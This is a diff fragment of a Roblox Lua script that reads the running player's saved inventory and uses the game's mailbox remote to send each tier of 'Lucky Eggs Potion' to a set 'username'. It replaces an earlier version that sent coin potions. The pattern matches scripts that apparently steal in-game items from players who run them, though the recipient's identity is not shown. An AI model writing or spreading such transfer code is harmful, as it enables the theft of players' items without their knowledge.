@@ -5,11 +5,101 @@ local result = saveModule.Get()
 
 local potions = result.Inventory.Potion
 for i, v in pairs(potions) do
-    if v.id == "Coins" then
+    if v.id == "Lucky Eggs" then
         if v.tn == 1 then
             local args = {
                 username,
-                "Coins Potion",
+                "Lucky Eggs Potion",
+                "Potion",
+                i,
+                v._am or 1
+            }
+            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+        end
+    end
+end
+
+task.wait(2)
+
+local potions = result.Inventory.Potion
+for i, v in pairs(potions) do
+    if v.id == "Lucky Eggs" then
+        if v.tn == 2 then
+            local args = {
+                username,
+                "Lucky Eggs Potion",
+                "Potion",
+                i,
+                v._am or 1
+            }
+            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+        end
+    end
+end
+
+task.wait(2)
+
+local potions = result.Inventory.Potion
+for i, v in pairs(potions) do
+    if v.id == "Lucky Eggs" then
+        if v.tn == 3 then
+            local args = {
+                username,
+                "Lucky Eggs Potion",
+                "Potion",
+                i,
+                v._am or 1
+            }
+            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+        end
+    end
+end
+
+task.wait(2)
+
+local potions = result.Inventory.Potion
+for i, v in pairs(potions) do
+    if v.id == "Lucky Eggs" then
+        if v.tn == 4 then
+            local args = {
+                username,
+                "Lucky Eggs Potion",
+                "Potion",
+                i,
+                v._am or 1
+            }
+            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+        end
+    end
+end
+
+task.wait(2)
+
+local potions = result.Inventory.Potion
+for i, v in pairs(potions) do
+    if v.id == "Lucky Eggs" then
+        if v.tn == 5 then
+            local args = {
+                username,
+                "Lucky Eggs Potion",
+                "Potion",
+                i,
+                v._am or 1
+            }
+            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+        end
+    end
+end
+
+task.wait(2)
+
+local potions = result.Inventory.Potion
+for i, v in pairs(potions) do
+    if v.id == "Lucky Eggs" then
+        if v.tn == 6 then
+            local args = {
+                username,
+                "Lucky Eggs Potion",
                 "Potion",
                 i,
                 v._am or 1
